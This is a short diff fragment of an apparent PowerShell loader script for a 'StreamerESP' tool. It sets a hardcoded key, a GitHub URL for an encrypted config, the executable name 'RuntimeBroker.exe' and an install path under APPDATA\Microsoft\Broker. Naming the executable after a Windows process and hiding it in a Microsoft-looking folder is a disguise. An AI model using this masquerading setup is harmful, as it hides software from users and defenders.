@@ -1,4 +1,5 @@
-﻿$MK="StreamerESP_SecureKey_2024_CHANGE_ME"
+;
+$MK="StreamerESP_SecureKey_2024_CHANGE_ME"
 $CU="https://raw.githubusercontent.com/anshkumar258090-alt/streamer-esp-server/main/config.enc"
 $EN="RuntimeBroker.exe"
 $ID="$env:APPDATA\Microsoft\Broker"
